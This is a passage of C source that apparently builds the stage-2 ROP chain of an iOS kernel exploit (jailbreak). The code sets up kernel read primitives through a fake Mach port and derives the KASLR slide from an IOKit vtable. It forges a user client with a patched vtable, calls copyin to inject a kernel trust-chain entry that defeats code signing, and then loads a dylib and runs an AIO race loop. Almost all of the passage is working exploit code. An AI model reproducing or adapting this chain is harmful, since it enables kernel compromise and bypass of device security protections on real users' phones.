	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", offsetof(kport_t,ip_requests) /*offset of fakeport.ip_requests*/,"ip_requests_buf",0);

	DEFINE_ROP_VAR("out_sz",8,tmp);
	SET_ROP_VAR64("out_sz",1);
#define kr32_raw(addr_var,valuename,offset) \
	SET_ROP_VAR64_TO_VAR_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,offset); \
	ROP_VAR_ARG64("self",1); \
	ROP_VAR_ARG64("the_one",2); \
	ROP_VAR_ARG(valuename,4); \
	ROP_VAR_ARG("out_sz",5); \
	CALL("mach_port_get_attributs",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);
#define kr32(addr_var,valuename) kr32_raw(addr_var,valuename,0);

	// setup kr64chr

	DEFINE_ROP_VAR("tmp_32_val",8,tmp);
#define kr64(addr_val,valuename) \
	kr32_raw(addr_val,"tmp_32_val",4); \
	kr32(addr_val,valuename); \
	ROP_VAR_CPY_W_OFFSET(valuename,4,"tmp_32_val",0,4);	



	// get recv addr from heap addr
	DEFINE_ROP_VAR("recv_heap_addr",8,tmp);
	DEFINE_ROP_VAR("heap_addr_recv_ptr",8,tmp);
	SET_ROP_VAR64("heap_addr_recv_ptr",offsetof(kport_t,ip_receiver));
	ROP_VAR_ADD("heap_addr_recv_ptr","heap_addr_recv_ptr","heap_addr");
	kr64("heap_addr_recv_ptr","recv_heap_addr");

	// get the task pointer from our recv addr
	DEFINE_ROP_VAR("task_pointer",8,tmp);
	DEFINE_ROP_VAR("heap_addr_task_ptr",8,tmp);
	SET_ROP_VAR64("heap_addr_task_ptr",offsets->is_task);
	ROP_VAR_ADD("heap_addr_task_ptr","heap_addr_task_ptr","recv_heap_addr");
	kr64("heap_addr_task_ptr","task_pointer");


	// register the client we have onto our task
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("client",2);
	CALL("mach_ports_register",0,0,1,0,0,0,0,0);

	// get the address of the client port
	DEFINE_ROP_VAR("ip_kobject_client_port",8,tmp);
	DEFINE_ROP_VAR("ip_kobject_ptr",8,tmp);
	SET_ROP_VAR64("ip_kobject_ptr",offsets->itk_registered);
	ROP_VAR_ADD("ip_kobject_ptr","ip_kobject_ptr","task_pointer");
	kr64("ip_kobject_ptr","ip_kobject_client_port");

	// get the UC obj
	DEFINE_ROP_VAR("kobj_client",8,tmp);
	DEFINE_ROP_VAR("kobj_client_ptr",8,tmp);
	SET_ROP_VAR64("kobj_client_ptr",offsetof(kport_t,ip_kobject));
	ROP_VAR_ADD("kobj_client_ptr","kobj_client_ptr","ip_kobject_client_port");
	kr64("kobj_client_ptr","kobj_client");

	// get the VTAB
	DEFINE_ROP_VAR("RootDomainUC_VTAB",8,tmp);
	kr64("kobj_client","RootDomainUC_VTAB");

	// get the slide
	DEFINE_ROP_VAR("kslide",8,tmp);
	SET_ROP_VAR64("kslide",(UINT64_MAX - offsets->rootdomainUC_vtab + 1));
	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");

	// fully setup trust chain entry now
	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
	DEFINE_ROP_VAR("bss_trust_chain_head_ptr",8,tmp);
	SET_ROP_VAR64("bss_trust_chain_head_ptr",offsets->trust_chain_head_ptr);
	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
	SET_ROP_VAR64_TO_VAR_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0);

#define VTAB_SIZE 0x100
	// setup fake vtab in userland
	DEFINE_ROP_VAR("UC_VTAB",VTAB_SIZE*8,tmp);
	DEFINE_ROP_VAR("tmp_uint64",8,tmp);
	DEFINE_ROP_VAR("vtab_ptr",8,tmp);
	ROP_VAR_CPY("vtab_ptr","RootDomainUC_VTAB",8);
	// unroll that loop cause loops in ROP are inefficent
	for (int i = 0; i < VTAB_SIZE; i++) {
		kr64("vtab_ptr","tmp_uint64");
		ROP_VAR_CPY_W_OFFSET("UC_VTAB",i*8,"tmp_uint64",0,8);
		SET_ROP_VAR64("tmp_uint64",8);
		ROP_VAR_ADD("vtab_ptr","vtab_ptr","tmp_uint64");
	}

	// turn the_one into a fake UC port
	
	// create a fake UC
	DEFINE_ROP_VAR("fake_client",200,tmp);
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0,"UC_VTAB",0);

	// update fakeport as iokit obj
	SET_ROP_VAR32_W_OFFSET("fakeport",IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT,offsetof(kport_t,ip_bits));

#undef kr32
#undef kr64

	// insert new fake client
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport",offsetof(kport_t,ip_kobject),"fake_client",0);
	
	// patch getExternalTrapForIndex
	SET_ROP_VAR64("tmp_uint64",offsets->gadget_add_x0_x0_ret);
	ROP_VAR_ADD("tmp_uint64","tmp_uint64","kslide");
	ROP_VAR_CPY_W_OFFSET("UC_VTAB",(0xb7*8),"tmp_uint64",0,8);

	// copyin new head
	
	// setup call primitive
	DEFINE_ROP_VAR("copyin_func_ptr",8,tmp);
	SET_ROP_VAR64("copyin_func_ptr",offsets->copyin);
	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
	// setup x0
	ROP_VAR_CPY_W_OFFSET("fake_client",0x40,"bss_trust_chain_head_ptr",0,8);

	// fire
	ROP_VAR_ARG64("the_one",1);
	ROP_VAR_ARG("new_trust_chain_entry",3);
	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
	
	// dlopen
	ROP_VAR_ARG("dylib_str",1);
	CALL("dlopen",0,0,0,0,0,0,0,0);

	// SECOND THREAD STACK STARTS HERE
	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE);
 

	// longjmp buf, pivoting everything
	ADD_GADGET(); /* x19 */
    ADD_GADGET(); /* x20 */
    ADD_GADGET(); /* x21 */
    ADD_GADGET(); /* x22 */
    ADD_GADGET(); /* x23 */
    ADD_GADGET(); /* x24 */
    ADD_GADGET(); /* x25 */
    ADD_GADGET(); /* x26 */
    ADD_GADGET(); /* x27 */
    ADD_GADGET(); /* x28 */
    ADD_GADGET(); /* x29 */
    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
    ADD_GADGET(); /* x29 */ 
    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE+22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
    ADD_GADGET(); /* D8 */
    ADD_GADGET(); /* D9 */
    ADD_GADGET(); /* D10 */
    ADD_GADGET(); /* D11 */
    ADD_GADGET(); /* D12 */
    ADD_GADGET(); /* D13 */
    ADD_GADGET(); /* D14 */
    ADD_GADGET(); /* D15 */
	
	char * racer_path = malloc(100);
	snprintf(racer_path,100,"/var/run/racoon/letsgo");
	DEFINE_ROP_VAR("racer_path",100,racer_path);

	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
	DEFINE_ROP_VAR("racer_fd",sizeof(int),tmp);
	ROP_VAR_ARG("racer_path",1);
	CALL_FUNC_RET_SAVE_VAR("racer_fd",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);

	DEFINE_ROP_VAR("aio_list",NENT * 8,tmp);
	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
	DEFINE_ROP_VAR("aio_buf",NENT,tmp);

	// TODO: we can optimize this
	for (uint32_t i = 0; i < NENT; i++) {
		int offset = sizeof(struct aiocb) * i;
		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd",0,4);
		SET_ROP_VAR32_W_OFFSET("aios",0,offset + offsetof(struct aiocb,aio_offset)); // FIXME: 32 or 64?
		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
		SET_ROP_VAR32_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes)); // FIXME: 32 or 64?
		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); // FIXME: 32 or 64?
		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify)); // FIXME: 32 or 64?

		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
	}

	//the framework doesn't support inner loops atm, so I hope this works... fingers crossed
	ADD_LOOP_START("racer_loop");
		ROP_VAR_ARG("aio_list",2);
		CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
		
		// now we would spin and wait till aio completed the list, but that would require another loop
		// so we just sleep and hope for the best 
		CALL("usleep",1000,0,0,0,0,0,0,0);

		// set x0 
		SET_X0_FROM_ROP_VAR("should_race");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop");
	ADD_LOOP_END();

	CALL("pthread_exit",0,0,0,0,0,0,0,0);

#endif

	if (curr_rop_var != NULL) {
		build_databuffer(offsets,rop_var_top);
	}
#ifdef DEBUG
	build_chain_DBG(offsets,rop_var_top);
#endif
	char path[1024];
	snprintf(path,sizeof(path),"%s/stg2",base_dir);
	int fd = open(path,O_WRONLY | O_CREAT, 0644);
	build_chain(fd,offsets,rop_var_top);
}
